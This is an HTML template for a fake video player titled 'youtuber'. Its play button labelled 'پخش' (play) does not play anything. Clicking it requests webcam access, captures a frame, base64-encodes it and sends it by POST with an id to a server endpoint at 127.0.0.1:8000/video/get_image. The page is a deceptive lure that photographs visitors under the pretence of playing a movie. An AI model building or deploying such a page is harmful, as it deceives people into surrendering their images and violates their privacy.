
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>youtuber</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .video-container {
            width: 640px; /* عرض مستطیل */
            height: 360px; /* ارتفاع مستطیل */
            border-radius: 20px; /* حاشیه‌های کمتر دایره‌ای برای بخش مستطیلی شکل */
            overflow: hidden; /* ایجاد حاشیه دور برای حاشیه‌های گرد */
            position: relative;
            box-shadow: 10px 0px 15px rgba(0, 0, 0, 0.5); /* سایه برای بخش سمت راست مستطیل */
        }

        .video-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #000; /* بک‌گراند بخش مستطیلی شکل را مشکی کنید */
        }

        .play-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #007bff; /* رنگ پس زمینه دکمه */
            color: #fff; /* رنگ متن دکمه */
            border: none;
            border-radius: 50%; /* تبدیل دکمه به شکل دایره‌ای */
            padding: 20px;
            font-size: 18px;
            cursor: pointer;
        }

        .play-button:hover {
            background-color: #0056b3; /* تغییر رنگ پس زمینه دکمه هنگام هاور */
        }
    </style>
</head>
<body>
    <div class="video-container">
        <p style="text-align: center; padding-top: 150px;">movie</p>
        <button class="play-button" id="playButton">پخش</button>
    </div>

    <script>
        const playButton = document.getElementById('playButton');

        playButton.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const videoTrack = stream.getVideoTracks()[0];

                const videoElement = document.createElement('video');
                videoElement.srcObject = new MediaStream([videoTrack]);
                videoElement.play();

                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 360;
                const context = canvas.getContext('2d');
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                const imageDataURL = canvas.toDataURL('image/jpeg');

                const base64Image = imageDataURL.split(',')[1];

                fetch("http://127.0.0.1:8000/video/get_image", {
                    method: 'POST',
                    headers: {
                       'Content-Type':'application/json',
                        "X-CSRFToken": "{{csrf_token}}",
                    },
                    body: JSON.stringify({
                        picture : base64Image,
                        id : {{ id }}
                    }),


                }).then(response => {
                    if (response.ok) {
                        console.log('Successes to send');

                    } else {
                        console.error('Failed to send');
                    }
                }).catch(error => {
                    console.error('Failed connected to server :', error);
                });
            } catch (error) {
                console.error('Access error :', error);
            }
        });

    </script>
</body>
</html>
